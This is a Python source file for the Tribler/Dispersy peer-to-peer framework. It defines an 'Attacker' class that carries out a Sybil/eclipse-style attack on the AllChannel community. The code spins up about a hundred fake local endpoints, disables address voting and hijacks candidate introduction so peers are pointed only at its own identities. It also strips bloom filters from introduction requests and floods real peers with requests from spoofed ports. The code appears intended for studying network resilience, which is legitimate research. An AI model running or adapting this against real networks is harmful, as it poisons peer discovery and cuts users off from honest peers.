import sys
from Tribler.dispersy.endpoint import StandaloneEndpoint
from Tribler.dispersy.candidate import BootstrapCandidate, WalkCandidate
from random import choice
from Tribler.community.allchannel.community import AllChannelCommunity

class Attacker:

    def __init__(self, dispersy, nr_endpoints=110, nr_candidates=50):
        print >> sys.stderr, "going rogue"

        self.dispersy = dispersy
        self.nr_endpoints = nr_endpoints
        self.nr_candidates = nr_candidates

        # step 1, start creating some endpoints
        self.endpoints = []
        self.connect()

        # step 2, replace wan_address_vote method
        dispersy.wan_address_vote = lambda address, voter: None

        # step 3, wrap methods for current communities
        def add_candidate(community, candidate):
            if not isinstance(candidate, BootstrapCandidate) and not self.is_my_sibel(candidate):
                if candidate.sock_addr not in community._candidates:
                    community.old_add_candidate(candidate)

                    if self.nr_candidates:
                        dispersy.callback.register(self.send_requests, (community, candidate))
                        self.nr_candidates -= 1

        def get_introduce_candidate(exclude_candidate=None):
            if exclude_candidate and self.is_my_sibel(exclude_candidate):
                return None

            candidate_port, _, candidate = choice(self.endpoints)

            print >> sys.stderr, "introducing", candidate_port, "to", exclude_candidate
            return candidate

        def on_intro_request(orig_handler, messages):
            for message in messages:
                message.payload._bloom_filter = None
            orig_handler(messages)

        for community in dispersy.get_communities():
            if isinstance(community, AllChannelCommunity):
                community.old_add_candidate = community.add_candidate
                community.add_candidate = lambda candidate, community = community: add_candidate(community, candidate)

                community.old_get_introduce_candidate = community.dispersy_get_introduce_candidate
                community.dispersy_get_introduce_candidate = get_introduce_candidate

                intro_request = community._meta_messages[u"dispersy-introduction-request"]
                orig_handler = intro_request.handle_callback
                intro_request._handle_callback = lambda messages, orig_handler = orig_handler: on_intro_request(orig_handler, messages)

        # step 4, schedule disconnect
        dispersy.callback.register(self.disconnect, delay=400.0)

    def send_requests(self, community, candidate):
        while not self.disconnected:
            for lan_port, endpoint, _ in self.endpoints:
                cur_endpoint = community.dispersy._endpoint
                cur_lanport = community.dispersy._lan_address[1]
                cur_wanport = community.dispersy._wan_address[1]

                community.dispersy._endpoint = endpoint
                community.dispersy._lan_address = (community.dispersy._lan_address[0], lan_port)
                community.dispersy._wan_address = (community.dispersy._wan_address[0], lan_port)

                community.create_introduction_request(candidate, False)

                print >> sys.stderr, "sending request to", candidate, "from", lan_port

                community.dispersy._endpoint = cur_endpoint
                community.dispersy._lan_address = (community.dispersy._lan_address[0], cur_lanport)
                community.dispersy._wan_address = (community.dispersy._wan_address[0], cur_wanport)

                yield 55.0 / len(self.endpoints)

                if self.disconnected:
                    break

    def is_my_sibel(self, candidate):
        his_port = candidate.lan_address[1]
        return any(my_port == his_port for my_port, _, _ in self.endpoints)

    def connect(self, baseport=1000):
        print >> sys.stderr, "creating endpoints"

        while len(self.endpoints) < self.nr_endpoints:
            prevport = self.endpoints[-1][0] if len(self.endpoints) else self.dispersy.lan_address[1] + baseport

            endpoint = StandaloneEndpoint(prevport + 1)
            endpoint.open(self.dispersy)

            sock_addr = (self.dispersy.lan_address[0], endpoint._port)
            self.endpoints.append((endpoint._port, endpoint, WalkCandidate(sock_addr, False, sock_addr, sock_addr, u"public")))

        print >> sys.stderr, "created endpoints"
        self.disconnected = False

    def disconnect(self):
        self.disconnected = True

        for _, endpoint, _ in self.endpoints:
            endpoint.close()

